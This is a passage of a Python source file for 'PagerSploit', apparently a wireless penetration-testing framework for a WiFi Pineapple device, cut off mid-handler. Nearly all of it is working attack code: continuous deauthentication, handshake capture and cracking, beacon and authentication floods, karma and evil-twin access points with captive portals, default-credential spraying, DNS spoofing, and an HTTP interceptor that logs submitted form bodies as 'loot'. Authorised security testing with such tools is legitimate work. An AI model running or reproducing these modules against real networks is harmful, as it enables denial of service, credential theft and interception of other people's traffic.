#!/usr/bin/env python3
"""
PagerSploit - Wireless Pentest Framework
WiFi Pineapple Pager // wickedNull

Browser UI at http://172.16.52.1:8080
"""

import os
import sys
import json
import time
import signal
import threading
import subprocess
import argparse
import socket
import re
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse, unquote_plus

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from pagerctl import Pager

# ---------------------------------------------------------------------------
# Globals
# ---------------------------------------------------------------------------
STATE = {
    'active_module': 'idle',
    'module_status': 'Standing by',
    'clients':       0,
    'loot_count':    0,
    'server_ip':     '172.16.52.1',
    'server_port':   '8080',
    'payload_dir':   '',
    'log':           [],          # list of {time, level, msg}
    'scan_results':  [],          # AP list from last scan
    'hosts':         [],          # LAN hosts from last arp scan
    'jobs':          {},          # running background jobs {name: Popen}
    'deauth_thread': None,
    'capture_file':  None,
    'stop_events':   {},
}

STATE_LOCK = threading.Lock()
NMAP_PATH  = '/mmc/root/payloads/user/reconnaissance/pager_bjorn/lib/nmap'
AIR_PATH   = '/mmc/usr/sbin'
AC_PATH    = '/mmc/usr/bin/aircrack-ng'
AP_IFACE   = 'wlan0'
MON_IFACE  = 'wlan0mon'
MON2_IFACE = 'wlan1mon'
EVIL_IP    = '10.0.0.1'

def log(msg, level='info'):
    entry = {'time': datetime.now().strftime('%H:%M:%S'), 'level': level, 'msg': msg}
    with STATE_LOCK:
        STATE['log'].append(entry)
        if len(STATE['log']) > 500:
            STATE['log'] = STATE['log'][-500:]
    print(f"[{entry['time']}] {msg}", flush=True)

def set_module(name, status='Running'):
    with STATE_LOCK:
        STATE['active_module'] = name
        STATE['module_status'] = status

def get_payload_dir():
    return STATE['payload_dir']

# ---------------------------------------------------------------------------
# Tool helpers
# ---------------------------------------------------------------------------
def run_cmd(cmd, timeout=30, env=None):
    try:
        e = dict(os.environ)
        if env:
            e.update(env)
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, env=e)
        return r.stdout + r.stderr
    except subprocess.TimeoutExpired:
        return 'TIMEOUT'
    except Exception as ex:
        return str(ex)

def stream_cmd(cmd, stop_event, output_list, timeout=300):
    """Run cmd, append lines to output_list, stop when stop_event set."""
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                text=True, bufsize=1)
        with STATE_LOCK:
            STATE['jobs'][' '.join(cmd[:2])] = proc
        for line in proc.stdout:
            if stop_event.is_set():
                proc.terminate()
                break
            output_list.append(line.rstrip())
        proc.wait()
    except Exception as e:
        output_list.append(f'ERROR: {e}')

# ---------------------------------------------------------------------------
# WiFi Modules
# ---------------------------------------------------------------------------
def wifi_scan():
    """Scan and return list of APs."""
    log('Starting WiFi scan...')
    set_module('WiFi Scan', 'Scanning...')
    aps = []
    try:
        out = subprocess.check_output(
            ['iw', 'dev', MON_IFACE, 'scan', 'passive'],
            stderr=subprocess.DEVNULL, timeout=15
        ).decode('utf-8', errors='replace')
    except Exception:
        try:
            out = subprocess.check_output(
                ['iw', 'dev', AP_IFACE, 'scan'],
                stderr=subprocess.DEVNULL, timeout=15
            ).decode('utf-8', errors='replace')
        except Exception as e:
            log(f'Scan failed: {e}', 'error')
            set_module('idle', 'Scan failed')
            return []

    current = {}
    for line in out.splitlines():
        line = line.strip()
        if line.startswith('BSS '):
            if current.get('ssid') is not None:
                aps.append(current)
            current = {
                'bssid':   line.split()[1].split('(')[0].strip(),
                'ssid':    '',
                'channel': '?',
                'signal':  -100,
                'enc':     'Open',
                'vendor':  ''
            }
        elif 'SSID:' in line:
            current['ssid'] = line.split('SSID:', 1)[1].strip()
        elif 'DS Parameter set: channel' in line:
            current['channel'] = line.split('channel', 1)[1].strip()
        elif 'signal:' in line:
            try:
                current['signal'] = float(line.split('signal:', 1)[1].split()[0])
            except Exception:
                pass
        elif 'WPA' in line:
            current['enc'] = 'WPA'
        elif 'RSN' in line:
            current['enc'] = 'WPA2'
        elif 'Privacy' in line and current.get('enc') == 'Open':
            current['enc'] = 'WEP'

    if current.get('ssid') is not None:
        aps.append(current)

    aps = [a for a in aps if a['ssid']]
    aps.sort(key=lambda x: x['signal'], reverse=True)

    with STATE_LOCK:
        STATE['scan_results'] = aps[:50]

    log(f'Scan complete: {len(aps)} APs found', 'success')
    set_module('idle', f'{len(aps)} APs found')
    return aps


def wifi_deauth(bssid, iface=MON2_IFACE, channel='6', count='0', client='FF:FF:FF:FF:FF:FF'):
    """
    Deauth attack. count=0 = continuous until stopped.
    Returns stop_event so caller can halt it.
    """
    stop = threading.Event()

    def _run():
        try:
            subprocess.run(['iw', 'dev', iface, 'set', 'channel', str(channel)],
                           stderr=subprocess.DEVNULL)
        except Exception:
            pass

        log(f'Deauth started: {bssid} ch{channel}', 'warn')
        set_module('Deauth', f'{bssid}')

        if count == '0':
            while not stop.is_set():
                subprocess.run(
                    [f'{AIR_PATH}/aireplay-ng', '--deauth', '10',
                     '-a', bssid, '-c', client, iface],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=15
                )
                stop.wait(1)
        else:
            subprocess.run(
                [f'{AIR_PATH}/aireplay-ng', '--deauth', str(count),
                 '-a', bssid, '-c', client, iface],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=60
            )

        log(f'Deauth stopped: {bssid}', 'info')
        set_module('idle', 'Deauth complete')

    t = threading.Thread(target=_run, daemon=True)
    t.start()
    with STATE_LOCK:
        STATE['stop_events']['deauth'] = stop
    return stop


def wifi_capture(bssid, channel, ssid='capture'):
    """
    Start airodump-ng capture on target AP.
    Returns (stop_event, cap_file_prefix)
    """
    stop = threading.Event()
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    cap_prefix = os.path.join(get_payload_dir(), 'loot', 'handshakes',
                              f'{ssid.replace(" ","_")}_{ts}')

    def _run():
        log(f'Capture started: {ssid} ({bssid}) ch{channel}', 'info')
        set_module('Capture', f'{ssid}')
        try:
            subprocess.run(['iw', 'dev', MON_IFACE, 'set', 'channel', str(channel)],
                           stderr=subprocess.DEVNULL)
        except Exception:
            pass

        proc = subprocess.Popen(
            [f'{AIR_PATH}/airodump-ng',
             '--bssid', bssid,
             '--channel', str(channel),
             '--write', cap_prefix,
             '--output-format', 'pcap',
             MON_IFACE],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        with STATE_LOCK:
            STATE['capture_file'] = cap_prefix + '-01.cap'
            STATE['jobs']['airodump'] = proc

        while not stop.is_set():
            # Check for handshake in cap file
            cap_file = cap_prefix + '-01.cap'
            if os.path.exists(cap_file):
                r = subprocess.run(
                    [AC_PATH, '-w', '/dev/null', cap_file],
                    capture_output=True, text=True, timeout=5
                )
                if 'handshake' in r.stdout.lower():
                    log(f'HANDSHAKE CAPTURED: {ssid}', 'success')
                    with STATE_LOCK:
                        STATE['loot_count'] += 1
            stop.wait(5)

        proc.terminate()
        log('Capture stopped', 'info')
        set_module('idle', 'Capture complete')

    t = threading.Thread(target=_run, daemon=True)
    t.start()
    with STATE_LOCK:
        STATE['stop_events']['capture'] = stop
    return stop, cap_prefix + '-01.cap'


def wifi_crack(cap_file, wordlist):
    """Run aircrack-ng against a cap file. Streams output."""
    output = []
    stop = threading.Event()

    def _run():
        log(f'Cracking: {os.path.basename(cap_file)}', 'info')
        set_module('Cracking', os.path.basename(cap_file))
        stream_cmd([AC_PATH, '-w', wordlist, cap_file], stop, output, timeout=3600)
        # Check result
        for line in output:
            if 'KEY FOUND' in line:
                log(f'KEY FOUND: {line}', 'success')
                with STATE_LOCK:
                    STATE['loot_count'] += 1
                break
        set_module('idle', 'Crack complete')

    t = threading.Thread(target=_run, daemon=True)
    t.start()
    with STATE_LOCK:
        STATE['stop_events']['crack'] = stop
        STATE['jobs']['crack_output'] = output
    return stop, output


def wifi_probe_harvest(duration=60):
    """Harvest probe requests to discover device SSIDs."""
    output = []
    stop = threading.Event()
    probes = {}  # mac -> [ssids]

    def _run():
        log('Probe harvest started', 'info')
        set_module('Probe Harvest', 'Listening...')

        proc = subprocess.Popen(
            [f'{AIR_PATH}/airodump-ng', '--output-format', 'csv',
             '--write', '/tmp/ps_probes', MON_IFACE],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        with STATE_LOCK:
            STATE['jobs']['probe_harvest'] = proc

        deadline = time.time() + duration
        while not stop.is_set() and time.time() < deadline:
            time.sleep(5)
            # Parse CSV for probe data
            csv_file = '/tmp/ps_probes-01.csv'
            if os.path.exists(csv_file):
                try:
                    with open(csv_file) as f:
                        content = f.read()
                    # Client section starts after blank line following AP section
                    parts = content.split('\r\n\r\n')
                    if len(parts) > 1:
                        for line in parts[1].splitlines():
                            cols = [c.strip() for c in line.split(',')]
                            if len(cols) > 6 and cols[0] and cols[0] != 'Station MAC':
                                mac = cols[0]
                                probed = [s.strip() for s in cols[6:] if s.strip()]
                                if probed:
                                    probes[mac] = probed
                                    output.append({'mac': mac, 'probes': probed})
                except Exception:
                    pass

        proc.terminate()
        with STATE_LOCK:
            STATE['jobs']['probe_results'] = output
        log(f'Probe harvest complete: {len(probes)} devices', 'success')
        set_module('idle', f'{len(probes)} devices found')

    t = threading.Thread(target=_run, daemon=True)
    t.start()
    with STATE_LOCK:
        STATE['stop_events']['probe_harvest'] = stop
        STATE['jobs']['probe_output'] = output
    return stop, output


def wifi_beacon_flood(ssids):
    """Flood beacon frames with list of SSIDs using mdk3/mdk4 if available, else airbase-ng loop."""
    stop = threading.Event()

    def _run():
        log(f'Beacon flood started: {len(ssids)} SSIDs', 'warn')
        set_module('Beacon Flood', f'{len(ssids)} SSIDs')

        # Write SSID list to file
        ssid_file = '/tmp/ps_beacon_ssids.txt'
        with open(ssid_file, 'w') as f:
            f.write('\n'.join(ssids))

        # Try mdk4 first
        mdk4 = subprocess.run(['which', 'mdk4'], capture_output=True, text=True).stdout.strip()
        if mdk4:
            proc = subprocess.Popen(
                [mdk4, MON_IFACE, 'b', '-f', ssid_file],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
        else:
            # Fallback: loop airbase-ng (one SSID at a time)
            proc = subprocess.Popen(
                [f'{AIR_PATH}/airbase-ng', '-e', ssids[0] if ssids else 'Free WiFi',
                 '-c', '6', MON_IFACE],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )

        with STATE_LOCK:
            STATE['jobs']['beacon_flood'] = proc

        stop.wait()
        proc.terminate()
        log('Beacon flood stopped', 'info')
        set_module('idle', 'Flood stopped')

    t = threading.Thread(target=_run, daemon=True)
    t.start()
    with STATE_LOCK:
        STATE['stop_events']['beacon_flood'] = stop
    return stop


def wifi_wps_scan(iface=MON_IFACE):
    """Scan for WPS-enabled APs using wash."""
    output = []
    log('WPS scan started', 'info')
    set_module('WPS Scan', 'Scanning...')

    wash = subprocess.run(['which', 'wash'], capture_output=True, text=True).stdout.strip()
    if not wash:
        wash = '/mmc/usr/sbin/wash'

    try:
        out = subprocess.check_output(
            [wash, '-i', iface, '-s', '-C'],
            stderr=subprocess.DEVNULL, timeout=20
        ).decode('utf-8', errors='replace')
        for line in out.splitlines()[2:]:  # skip header
            cols = line.split()
            if len(cols) >= 5:
                output.append({
                    'bssid':   cols[0],
                    'channel': cols[1],
                    'rssi':    cols[2],
                    'wps_ver': cols[3],
                    'locked':  cols[4],
                    'ssid':    ' '.join(cols[5:]) if len(cols) > 5 else ''
                })
    except Exception as e:
        log(f'WPS scan error: {e}', 'error')

    log(f'WPS scan: {len(output)} APs found', 'success')
    set_module('idle', f'{len(output)} WPS APs')
    return output


def wifi_karma(ssids=None, channel='6'):
    """
    Karma attack — respond to all probe requests with matching SSID.
    Uses airbase-ng with -P flag.
    """
    stop = threading.Event()

    def _run():
        log('Karma attack started', 'warn')
        set_module('Karma', 'Responding to probes...')

        cmd = [f'{AIR_PATH}/airbase-ng', '-P', '-C', '30',
               '-c', str(channel), '-e', 'Free WiFi', MON_IFACE]
        if ssids:
            # Use first SSID as base
            cmd[cmd.index('-e') + 1] = ssids[0]

        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        with STATE_LOCK:
            STATE['jobs']['karma'] = proc

        stop.wait()
        proc.terminate()
        log('Karma stopped', 'info')
        set_module('idle', 'Karma stopped')

    t = threading.Thread(target=_run, daemon=True)
    t.start()
    with STATE_LOCK:
        STATE['stop_events']['karma'] = stop
    return stop


def wifi_auth_flood(bssid, channel='6'):
    """Authentication flood DoS against target AP."""
    stop = threading.Event()

    def _run():
        log(f'Auth flood: {bssid}', 'warn')
        set_module('Auth Flood', bssid)
        try:
            subprocess.run(['iw', 'dev', MON2_IFACE, 'set', 'channel', str(channel)],
                           stderr=subprocess.DEVNULL)
        except Exception:
            pass

        while not stop.is_set():
            subprocess.run(
                [f'{AIR_PATH}/aireplay-ng', '--fakeauth', '0',
                 '-a', bssid, MON2_IFACE],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10
            )
            stop.wait(1)

        log('Auth flood stopped', 'info')
        set_module('idle', 'Flood stopped')

    t = threading.Thread(target=_run, daemon=True)
    t.start()
    with STATE_LOCK:
        STATE['stop_events']['auth_flood'] = stop
    return stop


def wifi_evil_twin(ssid, channel='6', portal_file=None):
    """
    Evil twin AP using airbase-ng.
    Optionally serve a captive portal if portal_file given.
    """
    stop = threading.Event()

    def _run():
        log(f'Evil twin: {ssid} ch{channel}', 'warn')
        set_module('Evil Twin', ssid)

        proc = subprocess.Popen(
            [f'{AIR_PATH}/airbase-ng', '-e', ssid,
             '-c', str(channel), MON_IFACE],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        with STATE_LOCK:
            STATE['jobs']['evil_twin'] = proc

        # Set up at0 interface from airbase-ng
        time.sleep(2)
        subprocess.run(['ifconfig', 'at0', '10.0.0.1', 'netmask', '255.255.255.0', 'up'],
                       stderr=subprocess.DEVNULL)
        subprocess.run(['nft', 'add', 'table', 'ip', 'ps_eviltwin'], stderr=subprocess.DEVNULL)
        subprocess.run(['nft', 'add', 'chain', 'ip', 'ps_eviltwin', 'prerouting',
                        '{', 'type', 'nat', 'hook', 'prerouting', 'priority', '-100', ';', '}'],
                       stderr=subprocess.DEVNULL)
        subprocess.run(['nft', 'add', 'rule', 'ip', 'ps_eviltwin', 'prerouting',
                        'iif', 'at0', 'tcp', 'dport', '80',
                        'dnat', 'to', '10.0.0.1:8888'], stderr=subprocess.DEVNULL)

        # Serve portal if provided
        portal_proc = None
        if portal_file and os.path.exists(portal_file):
            import shutil
            os.makedirs('/tmp/ps_portal', exist_ok=True)
            shutil.copy(portal_file, '/tmp/ps_portal/index.html')
            portal_proc = subprocess.Popen(
                [sys.executable, '-m', 'http.server', '8888',
                 '--directory', '/tmp/ps_portal'],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )

        stop.wait()
        proc.terminate()
        if portal_proc:
            portal_proc.terminate()

        # Cleanup
        subprocess.run(['nft', 'delete', 'table', 'ip', 'ps_eviltwin'],
                       stderr=subprocess.DEVNULL)
        log('Evil twin stopped', 'info')
        set_module('idle', 'Twin stopped')

    t = threading.Thread(target=_run, daemon=True)
    t.start()
    with STATE_LOCK:
        STATE['stop_events']['evil_twin'] = stop
    return stop


# ---------------------------------------------------------------------------
# LAN Modules
# ---------------------------------------------------------------------------
def lan_arp_scan(subnet='172.16.52.0/24'):
    """ARP scan using nping or nmap."""
    log(f'ARP scan: {subnet}', 'info')
    set_module('ARP Scan', subnet)
    hosts = []

    nmap = NMAP_PATH if os.path.exists(NMAP_PATH) else 'nmap'
    out = run_cmd([nmap, '-sn', '--send-ip', subnet], timeout=60)

    for line in out.splitlines():
        if 'Nmap scan report' in line:
            ip = line.split()[-1].strip('()')
            hosts.append({'ip': ip, 'mac': '', 'vendor': '', 'ports': []})
        elif 'MAC Address' in line:
            parts = line.split('MAC Address:')
            if parts and hosts:
                mac_parts = parts[1].strip().split(' ', 1)
                hosts[-1]['mac'] = mac_parts[0]
                if len(mac_parts) > 1:
                    hosts[-1]['vendor'] = mac_parts[1].strip('()')

    with STATE_LOCK:
        STATE['hosts'] = hosts

    log(f'ARP scan: {len(hosts)} hosts', 'success')
    set_module('idle', f'{len(hosts)} hosts found')
    return hosts


def lan_port_scan(target, ports='1-1024'):
    """Port scan target with nmap."""
    log(f'Port scan: {target} ports {ports}', 'info')
    set_module('Port Scan', target)

    nmap = NMAP_PATH if os.path.exists(NMAP_PATH) else 'nmap'
    out = run_cmd([nmap, '-p', ports, '--open', '-sV', target], timeout=120)

    results = []
    for line in out.splitlines():
        if '/tcp' in line and 'open' in line:
            parts = line.split()
            results.append({
                'port':    parts[0],
                'state':   parts[1],
                'service': ' '.join(parts[2:]) if len(parts) > 2 else ''
            })

    log(f'Port scan {target}: {len(results)} open ports', 'success')
    set_module('idle', f'{len(results)} ports open')

    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    out_file = os.path.join(get_payload_dir(), 'loot', 'scans', f'{target}_{ts}.txt')
    with open(out_file, 'w') as f:
        f.write(out)

    return results, out


def lan_default_creds(target, services=None):
    """
    Try common default credentials against discovered services.
    Covers: HTTP basic auth, routers, cameras.
    """
    DEFAULT_CREDS = [
        ('admin', 'admin'), ('admin', 'password'), ('admin', '1234'),
        ('admin', '12345'), ('admin', ''),  ('root', 'root'),
        ('root', 'toor'), ('root', ''), ('user', 'user'),
        ('administrator', 'administrator'), ('admin', 'admin123'),
    ]

    results = []
    log(f'Default cred spray: {target}', 'warn')
    set_module('Cred Spray', target)

    # HTTP basic auth check
    for user, pwd in DEFAULT_CREDS:
        try:
            import urllib.request, base64
            req = urllib.request.Request(f'http://{target}/')
            creds = base64.b64encode(f'{user}:{pwd}'.encode()).decode()
            req.add_header('Authorization', f'Basic {creds}')
            resp = urllib.request.urlopen(req, timeout=3)
            if resp.status == 200:
                results.append({'service': 'http', 'user': user, 'pass': pwd, 'target': target})
                log(f'CREDS FOUND http://{target} {user}:{pwd}', 'success')
                with STATE_LOCK:
                    STATE['loot_count'] += 1
        except Exception:
            pass

    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    if results:
        out_file = os.path.join(get_payload_dir(), 'loot', 'credentials',
                                f'defaultcreds_{target}_{ts}.json')
        with open(out_file, 'w') as f:
            json.dump(results, f, indent=2)

    set_module('idle', f'{len(results)} creds found')
    return results


def lan_mdns_discover():
    """Passive mDNS/SSDP discovery."""
    import socket
    devices = []
    log('mDNS/SSDP discovery started', 'info')
    set_module('mDNS Discovery', 'Listening...')

    # SSDP M-SEARCH
    ssdp_req = (
        'M-SEARCH * HTTP/1.1\r\n'
        'HOST: 239.255.255.250:1900\r\n'
        'MAN: "ssdp:discover"\r\n'
        'MX: 3\r\n'
        'ST: ssdp:all\r\n\r\n'
    )
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.settimeout(5)
        sock.sendto(ssdp_req.encode(), ('239.255.255.250', 1900))
        while True:
            try:
                data, addr = sock.recvfrom(1024)
                device = {'ip': addr[0], 'protocol': 'SSDP', 'info': data.decode('utf-8', errors='replace')[:200]}
                devices.append(device)
            except socket.timeout:
                break
        sock.close()
    except Exception as e:
        log(f'SSDP error: {e}', 'error')

    log(f'Discovery: {len(devices)} devices', 'success')
    set_module('idle', f'{len(devices)} devices')
    return devices


def lan_dns_spoof(domain, redirect_ip, iface='wlan0'):
    """Add DNS spoof entry via dnsmasq."""
    log(f'DNS spoof: {domain} -> {redirect_ip}', 'warn')
    spoof_file = '/tmp/ps_dns_spoof.conf'
    with open(spoof_file, 'a') as f:
        f.write(f'address=/{domain}/{redirect_ip}\n')
    # Signal dnsmasq to reload
    subprocess.run(['killall', '-HUP', 'dnsmasq'], stderr=subprocess.DEVNULL)
    log(f'DNS spoof active: {domain}', 'success')
    return True


def lan_http_intercept(iface='wlan0'):
    """
    ARP poison + HTTP intercept using iptables redirect.
    Requires bettercap or mitmproxy — falls back to basic iptables redirect.
    """
    stop = threading.Event()
    log('HTTP intercept started', 'warn')
    set_module('HTTP Intercept', 'Active')

    # Enable IP forwarding
    subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], stderr=subprocess.DEVNULL)

    # nftables redirect port 80 to intercept server
    subprocess.run(['nft', 'add', 'table', 'ip', 'ps_intercept'], stderr=subprocess.DEVNULL)
    subprocess.run(['nft', 'add', 'chain', 'ip', 'ps_intercept', 'prerouting',
                    '{', 'type', 'nat', 'hook', 'prerouting', 'priority', '-100', ';', '}'],
                   stderr=subprocess.DEVNULL)
    subprocess.run(['nft', 'add', 'rule', 'ip', 'ps_intercept', 'prerouting',
                    'iif', iface, 'tcp', 'dport', '80',
                    'redirect', 'to', ':8181'], stderr=subprocess.DEVNULL)

    intercept_log = os.path.join(get_payload_dir(), 'loot', 'credentials',
                                 f'http_intercept_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log')

    class InterceptHandler(BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def do_GET(self):
            entry = f'[{datetime.now().strftime("%H:%M:%S")}] GET {self.headers.get("Host","")}{self.path} from {self.client_address[0]}\n'
            with open(intercept_log, 'a') as f:
                f.write(entry)
            log(f'HTTP: {entry.strip()}', 'info')
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'<html><body>Loading...</body></html>')
        def do_POST(self):
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length).decode('utf-8', errors='replace')
            entry = f'[{datetime.now().strftime("%H:%M:%S")}] POST {self.headers.get("Host","")}{self.path} from {self.client_address[0]}: {body[:200]}\n'
            with open(intercept_log, 'a') as f:
                f.write(entry)
            log(f'HTTP POST captured: {body[:100]}', 'success')
            with STATE_LOCK:
                STATE['loot_count'] += 1
            self.send_response(302)
            self.send_header('Location', '/')
            self.end_headers()

    server = HTTPServer(('0.0.0.0', 8181), InterceptHandler)

    def _run():
        while not stop.is_set():
            server.handle_request()
        subprocess.run(['nft', 'delete', 'table', 'ip', 'ps_intercept'],
                       stderr=subprocess.DEVNULL)
        log('HTTP intercept stopped', 'info')
        set_module('idle', 'Intercept stopped')

    t = threading.Thread(target=_run, daemon=True)
    t.start()
    with STATE_LOCK:
        STATE['stop_events']['http_intercept'] = stop
    return stop


# ---------------------------------------------------------------------------
# Loot Manager
# ---------------------------------------------------------------------------
def get_loot_list():
    loot = []
    loot_dir = os.path.join(get_payload_dir(), 'loot')
    for root, dirs, files in os.walk(loot_dir):
        for f in files:
            path = os.path.join(root, f)
            stat = os.stat(path)
            loot.append({
                'name':     f,
                'path':     path,
                'category': os.path.basename(root),
                'size':     stat.st_size,
                'modified': datetime.fromtimestamp(stat.st_mtime).strftime('%Y-%m-%d %H:%M')
            })
    loot.sort(key=lambda x: x['modified'], reverse=True)
    return loot


def get_wordlists():
    wl_dir = os.path.join(get_payload_dir(), 'wordlists')
    system_wls = ['/root/loot/wordlists', '/mmc/wordlists', '/root/wordlists']
    lists = []
    for d in [wl_dir] + system_wls:
        if os.path.isdir(d):
            for f in os.listdir(d):
                if f.endswith(('.txt', '.lst', '.gz')):
                    path = os.path.join(d, f)
                    lists.append({'name': f, 'path': path,
                                  'size': os.path.getsize(path)})
    return lists


def stop_module(name):
    """Stop a running module by name."""
    with STATE_LOCK:
        ev = STATE['stop_events'].get(name)
    if ev:
        ev.set()
        log(f'Stopped: {name}', 'info')
        return True
    # Also try killing by job name
    with STATE_LOCK:
        proc = STATE['jobs'].get(name)
    if proc and hasattr(proc, 'terminate'):
        try:
            proc.terminate()
        except Exception:
            pass
        return True
    return False


# ---------------------------------------------------------------------------
# HTTP API Handler
# ---------------------------------------------------------------------------
class APIHandler(BaseHTTPRequestHandler):
    def log_message(self, *a): pass

    def send_json(self, data, code=200):
        body = json.dumps(data).encode()
        self.send_response(code)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', len(body))
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(body)

    def send_html(self, html):
        body = html.encode()
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.send_header('Content-Length', len(body))
        self.end_headers()
        self.wfile.write(body)

    def get_body(self):
        length = int(self.headers.get('Content-Length', 0))
        if length:
            raw = self.rfile.read(length).decode('utf-8', errors='replace')
            try:
                return json.loads(raw)
            except Exception:
                return dict(parse_qs(raw))
        return {}

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

    def do_GET(self):
        path = urlparse(self.path).path

        if path == '/' or path == '/index.html':
            self.send_html(get_ui_html())
            return

        if path == '/api/state':
            with STATE_LOCK:
                s = dict(STATE)
                s['jobs'] = list(STATE['jobs'].keys())
                s['stop_events'] = list(STATE['stop_events'].keys())
            self.send_json(s)
            return

        if path == '/api/log':
            with STATE_LOCK:
                self.send_json(STATE['log'][-100:])
            return

        if path == '/api/scans':
            with STATE_LOCK:
                self.send_json(STATE['scan_results'])
            return

        if path == '/api/hosts':
            with STATE_LOCK:
                self.send_json(STATE['hosts'])
            return

        if path == '/api/loot':
            self.send_json(get_loot_list())
            return

        if path == '/api/wordlists':
            self.send_json(get_wordlists())
            return

        if path == '/api/portals':
            portal_dir = os.path.join(get_payload_dir(), 'portals')
            portals = []
            if os.path.isdir(portal_dir):
                portals = [f for f in os.listdir(portal_dir) if f.endswith('.html')]
            self.send_json(portals)
            return

        if path.startswith('/api/loot/download/'):
            fname = unquote_plus(path[len('/api/loot/download/'):])
            loot_items = get_loot_list()
            target = next((l for l in loot_items if l['name'] == fname), None)
            if target and os.path.exists(target['path']):
                with open(target['path'], 'rb') as f:
                    data = f.read()
                self.send_response(200)
                self.send_header('Content-Disposition', f'attachment; filename="{fname}"')
                self.send_header('Content-Length', len(data))
                self.end_headers()
                self.wfile.write(data)
            else:
                self.send_json({'error': 'not found'}, 404)
            return

        self.send_json({'error': 'not found'}, 404)

    def do_POST(self):
        path = urlparse(self.path).path
        body = self.get_body()

        # --- WiFi ---
        if path == '/api/wifi/scan':
            threading.Thread(target=wifi_scan, daemon=True).start()
            self.send_json({'status': 'scanning'})

        elif path == '/api/wifi/deauth':
            bssid   = body.get('bssid', '')
            channel = body.get('channel', '6')
            count   = body.get('count', '0')
            client  = body.get('client', 'FF:FF:FF:FF:FF:FF')
            if bssid:
                wifi_deauth(bssid, channel=str(channel), count=str(count), client=client)
                self.send_json({'status': 'deauth started', 'bssid': bssid})
            else:
                self.send_json({'error': 'bssid required'}, 400)

        elif path == '/api/wifi/capture':
            bssid   = body.get('bssid', '')
            channel = body.get('channel', '6')
            ssid    = body.get('ssid', 'capture')
            if bssid:
                stop, cap_file = wifi_capture(bssid, str(channel), ssid)
                self.send_json({'status': 'capture started', 'file': cap_file})
            else:
                self.send_json({'error': 'bssid required'}, 400)

        elif path == '/api/wifi/crack':
            cap_file = body.get('cap_file', '')
            wordlist = body.get('wordlist', '')
            if cap_file and wordlist:
                stop, output = wifi_crack(cap_file, wordlist)
                self.send_json({'status': 'cracking started'})
            else:
                self.send_json({'error': 'cap_file and wordlist required'}, 400)

        elif path == '/api/wifi/probe_harvest':
            duration = int(body.get('duration', 60))
            stop, output = wifi_probe_harvest(duration)
            self.send_json({'status': 'harvesting', 'duration': duration})

        elif path == '/api/wifi/beacon_flood':
            ssids = body.get('ssids', ['Free WiFi'])
            if isinstance(ssids, str):
                ssids = [s.strip() for s in ssids.split('\n') if s.strip()]
            wifi_beacon_flood(ssids)
            self.send_json({'status': 'flooding', 'count': len(ssids)})

        elif path == '/api/wifi/wps_scan':
            threading.Thread(
                target=lambda: self.send_json({'results': wifi_wps_scan()}),
                daemon=True
            ).start()
            self.send_json({'status': 'scanning'})

        elif path == '/api/wifi/karma':
            channel = body.get('channel', '6')
            ssids   = body.get('ssids', [])
            wifi_karma(ssids, channel)
            self.send_json({'status': 'karma active'})

        elif path == '/api/wifi/auth_flood':
            bssid   = body.get('bssid', '')
            channel = body.get('channel', '6')
            if bssid:
                wifi_auth_flood(bssid, channel)
                self.send_json({'status': 'auth flood started'})
            else:
                self.send_json({'error': 'bssid required'}, 400)

        elif path == '/api/wifi/evil_twin':
            ssid    = body.get('ssid', '')
            channel = body.get('channel', '6')
            portal  = body.get('portal', None)
            if portal:
                portal = os.path.join(get_payload_dir(), 'portals', portal)
            if ssid:
                wifi_evil_twin(ssid, channel, portal)
                self.send_json({'status': 'evil twin active', 'ssid': ssid})
            else:
                self.send_json({'error': 'ssid required'}, 400)

        # --- LAN ---
        elif path == '/api/lan/arp_scan':
            subnet = body.get('subnet', '172.16.52.0/24')
            threading.Thread(target=lan_arp_scan, args=(subnet,), daemon=True).start()
            self.send_json({'status': 'scanning', 'subnet': subnet})

        elif path == '/api/lan/port_scan':
            target = body.get('target', '')
            ports  = body.get('ports', '1-1024')
            if target:
                threading.Thread(target=lan_port_scan, args=(target, ports), daemon=True).start()
                self.send_json({'status': 'scanning', 'target': target})
            else:
                self.send_json({'error': 'target required'}, 400)

        elif path == '/api/lan/default_creds':
            target = body.get('target', '')
            if target:
                threading.Thread(target=lan_default_creds, args=(target,), daemon=True).start()
                self.send_json({'status': 'spraying', 'target': target})
            else:
                self.send_json({'error': 'target required'}, 400)

        elif path == '/api/lan/mdns':
            threading.Thread(target=lan_mdns_discover, daemon=True).start()
            self.send_json({'status': 'discovering'})

        elif path == '/api/lan/dns_spoof':
            domain = body.get('domain', '')
            redirect = body.get('redirect', '')
            if domain and redirect:
                lan_dns_spoof(domain, redirect)
